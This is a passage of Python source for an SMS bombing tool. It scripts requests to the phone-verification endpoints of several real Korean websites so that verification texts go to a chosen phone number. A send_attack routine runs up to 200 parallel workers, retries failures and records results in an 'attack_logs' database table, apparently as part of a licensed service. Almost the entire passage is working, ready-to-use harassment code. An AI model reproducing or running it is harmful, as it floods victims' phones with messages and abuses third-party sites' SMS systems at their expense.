        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://tkdcon.net/portalk/mberJoin/mberSbsCrbRegist.do",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
            },
            timeout=10,
        )

        payload = {
            "photoAtchFileSeq": "",
            "useStplatAgreYn": "Y",
            "perInfoEssntlAgreYn": "Y",
            "perInfoChoiceAgreYn": "N",
            "perInfoProcAgreYn": "",
            "rlnmCrtfcCheck": "",
            "selfCrtfcCheck": "",
            "lglrpsYn": "",
            "dplctConfirmKey": "1",
            "danCertifiNo": "",
            "addr1": "",
            "addr2": "",
            "imgNm": "",
            "idCheckAt": "",
            "foreignerYn": "N",
            "memberFgCd": "C32001",
            "memberStatusCd": "C39001",
            "emailAddr1": "",
            "memberChk": "",
            "brthdy": "",
            "zipCd": "",
            "sexFg": "",
            "nltyCd": "051",
            "perCrtfcKey": "",
            "resiNoCheck": "",
            "naverCertiYn": "U",
            "file": "",
            "filePath": "",
            "atchFileNm": "",
            "addInfoAgreYn": "Y",
            "korNm": "",
            "resiNoPre": "",
            "resiNoRr": "",
            "lglrpsKorNm": "",
            "lglrpsBirthday": "",
            "lglrpsHnphNo": "",
            "engNm": "",
            "memberId": "",
            "passwd": "",
            "passwdConfirm": "",
            "emailId": "",
            "customDomain": "",
            "emailSelect": "custom",
            "cellPhoneNo": digits,
            "crtfcFgCd": "smsSendBtn",
            "emailCertiCd": "",
            "emailRecptnYn": "Y",
            "smsRecptnYn": "Y",
            "localFg": "Y",
            "nationCd": "051",
            "nationNm": "대한민국",
            "kor_zipCd": "",
            "kor_addr1": "",
            "kor_addr2": "",
            "eng_addr1": "",
            "eng_addr2": "",
            "eng_addr3": "",
            "eng_zipCd": "",
        }

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://tkdcon.net",
            "Referer": "https://tkdcon.net/portalk/mberJoin/mberSbsCrbRegist.do",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        r = s.post(
            "https://tkdcon.net/portalk/mberJoin/smsCerti.do",
            data=payload, headers=h, timeout=10,
        )
        return ("tkdcon", r.status_code, r.text[:500])
    except Exception as e:
        return ("tkdcon", "EXC", str(e))


def send_ingang(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://edu.ingang.go.kr/NGLMS/member/member",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
            },
            timeout=10,
        )

        payload = {
            "mno": "0",
            "type": "",
            "step": "step4",
            "studType": "C",
            "presentURL": "https://edu.ingang.go.kr",
            "fullURL": "",
            "aspSeq": "336",
            "serverURL": "edu.ingang.go.kr",
            "hpTel": hyphen,
            "userNm": "김민수",
            "hpTel1": m1,
            "hpTel2": m2,
            "hpTel3": m3,
            "authNo": "",
        }

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://edu.ingang.go.kr",
            "Referer": "https://edu.ingang.go.kr/NGLMS/member/member",
            "X-CSRF-TOKEN": "",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        r = s.post(
            "https://edu.ingang.go.kr/NGLMS/member/join/smsCkSend",
            data=payload, headers=h, timeout=10,
        )
        return ("ingang", r.status_code, r.text[:500])
    except Exception as e:
        return ("ingang", "EXC", str(e))


def send_jnoble(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://jnoble.co.kr/bbs/register_form.php",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
            },
            timeout=10,
        )

        payload = {
            "mb_hp": digits,
            "sms_check": "",
            "smsmod": "smscheck",
            "sms_num": "",
        }

        h = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://jnoble.co.kr",
            "Referer": "https://jnoble.co.kr/bbs/register_form.php",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "iframe",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }

        r = s.post(
            "https://jnoble.co.kr/prog/sms_req.php",
            data=payload, headers=h, timeout=10,
        )
        return ("jnoble", r.status_code, r.text[:500])
    except Exception as e:
        return ("jnoble", "EXC", str(e))


def send_purples(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://www.purples.co.kr/member/join.asp",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
            },
            timeout=10,
        )

        params = {
            "pgcate": "0",
            "tsub": "1",
            "mobile1": m1,
            "mobile2": m2,
            "mobile3": m3,
        }
        h = {
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://www.purples.co.kr/member/join.asp",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.get(
            "https://www.purples.co.kr/inc_folder/fnc_file/hpConfirm.asp",
            params=params, headers=h, timeout=10,
        )
        return ("purples", r.status_code, r.text[:200])
    except Exception as e:
        return ("purples", "EXC", str(e))


def send_thirtymall_e_ncp(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://thirtymall.com",
            "Referer": "https://thirtymall.com/",
            "clientid": "UoI6WXPCVmuu7u/mv6tH2g==",
            "platform": "MOBILE_WEB",
            "version": "1.0",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        r = _post(
            "https://shop-api.e-ncp.com/authentications",
            json={
                "notiAccount": digits,
                "memberNo": None,
                "usage": "JOIN",
                "memberName": "",
                "type": "SMS",
            },
            headers=h, timeout=10,
        )
        return ("thirtymall-e-ncp", r.status_code, r.text[:400])
    except Exception as e:
        return ("thirtymall-e-ncp", "EXC", str(e))


def send_attrangs(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://m.attrangs.co.kr/member/join_step1.php",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
            },
            timeout=10,
        )

        payload = {
            "mode": "phone_chk",
            "cp1": m1,
            "cp2": m2,
            "cp3": m3,
        }

        h = {
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://m.attrangs.co.kr",
            "Referer": "https://m.attrangs.co.kr/member/join_step2.php",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        r = s.post(
            "https://m.attrangs.co.kr/member/join_step2.php",
            data=payload, headers=h, timeout=10,
        )
        return ("attrangs", r.status_code, r.text[:500])
    except Exception as e:
        return ("attrangs", "EXC", str(e))


def send_dg_9284(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://dg-9284.com",
            "Referer": "https://dg-9284.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }
        rand_id = "as" + uuid.uuid4().hex[:8]
        r = _post(
            "https://api.dg-9284.com/apis/securitytextrequest",
            json={"id": rand_id, "phone": digits},
            headers=h, timeout=10,
        )
        return ("dg-9284", r.status_code, r.text[:400])
    except Exception as e:
        return ("dg-9284", "EXC", str(e))


ALL_SENDERS = [
    send_tkdcon,
    send_tkdcon,

    send_ingang,
    send_ingang,

    send_jnoble,
    send_jnoble,

    send_purples,
    send_purples,

    send_thirtymall_e_ncp,
    send_thirtymall_e_ncp,

    send_attrangs,
    send_attrangs,

    send_dg_9284,
    send_dg_9284,

    send_ba_ro,
    send_ba_ro,
    send_ba_ro,
    send_ba_ro,
    send_ba_ro,
    send_ba_ro,
    send_ba_ro,

    send_evplug,
    send_peachmarket,
    send_genimarket,
    send_busmall,
    send_busmall_via_cafe24,
    send_allfresh_via_cafe24,
    send_cr_333,
    send_bizzle,
    send_e_ncp,
    send_8dogam,
    send_santafarmer,
]


class SMSWorker:
    MAX_WORKERS = 200

    def __init__(self, db_path='license.db', retry_ratio=0.7, max_retry_rounds=2):
        self.db_path = db_path
        self.retry_ratio = retry_ratio
        self.max_retry_rounds = max_retry_rounds

    def send_attack(self, log_id, phone, count, status_callback=None):
        import threading as _th

        digits, hyphen = normalize_phone(phone)
        m1, m2, m3 = split_phone(phone)
        masked = mask_phone(phone)

        n = len(ALL_SENDERS)
        if n == 0 or count <= 0:
            return 0, 0, 0.0

        tasks = [ALL_SENDERS[i % n] for i in range(count)]
        worker_count = min(count, self.MAX_WORKERS)

        print(f"🚀 [SMSWorker] 시작: {masked}, 총 {count}회 "
              f"(엔드포인트 {n}개 · 워커 {worker_count}개 · 프록시 ON)")

        total_success = 0
        total_fail = 0
        done = 0
        start = time.time()

        _lock = _th.Lock()
        last_cb = [time.time()]

        def _bump(ok: bool):
            nonlocal total_success, total_fail, done
            with _lock:
                if ok:
                    total_success += 1
                else:
                    total_fail += 1
                done += 1

                now = time.time()
                if status_callback and (now - last_cb[0] >= 1.5):
                    last_cb[0] = now
                    try:
                        status_callback(log_id, total_success, total_fail, count)
                    except Exception:
                        pass

        def _run_one(sender):
            try:
                name, status, body = sender(digits, hyphen, m1, m2, m3)
                ok = is_success(name, status, body)
                _bump(ok)
                return ok
            except Exception:
                _bump(False)
                return False

        failed_tasks = []
        with ThreadPoolExecutor(max_workers=worker_count) as ex:
            futures = {ex.submit(_run_one, s): s for s in tasks}
            for f in as_completed(futures):
                if not f.result():
                    failed_tasks.append(futures[f])

        elapsed = time.time() - start

        for retry_round in range(1, self.max_retry_rounds + 1):
            if not failed_tasks:
                break

            retry_count = max(1, int(len(failed_tasks) * self.retry_ratio))
            retry_tasks = random.sample(failed_tasks, min(retry_count, len(failed_tasks)))
            retry_workers = min(len(retry_tasks), self.MAX_WORKERS)

            print(f"🔄 [SMSWorker] 재시도 {retry_round}/{self.max_retry_rounds}: "
                  f"실패 {len(failed_tasks)}개 중 {len(retry_tasks)}개 재시도 "
                  f"(워커 {retry_workers})")

            with _lock:
                total_fail -= len(retry_tasks)
                done -= len(retry_tasks)

            still_failed = []
            with ThreadPoolExecutor(max_workers=retry_workers) as ex:
                futures = {ex.submit(_run_one, s): s for s in retry_tasks}
                for f in as_completed(futures):
                    if not f.result():
                        still_failed.append(futures[f])

            failed_tasks = still_failed

        if status_callback:
            try:
                status_callback(log_id, total_success, total_fail, count)
            except Exception:
                pass

        elapsed = time.time() - start

        try:
            conn = sqlite3.connect(self.db_path)
            conn.execute(
                "UPDATE attack_logs SET success = ?, fail = ?, "
                "status = 'completed', ended_at = CURRENT_TIMESTAMP "
                "WHERE id = ?",
                (total_success, total_fail, log_id),
            )
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[SMSWorker] DB 오류: {e}")

        rate = (total_success + total_fail) / elapsed if elapsed > 0 else 0
        print(f"✅ [SMSWorker] 완료: 성공={total_success}, 실패={total_fail}, "
              f"소요={elapsed:.1f}s ({rate:.1f} req/s)")

        return total_success, total_fail, elapsed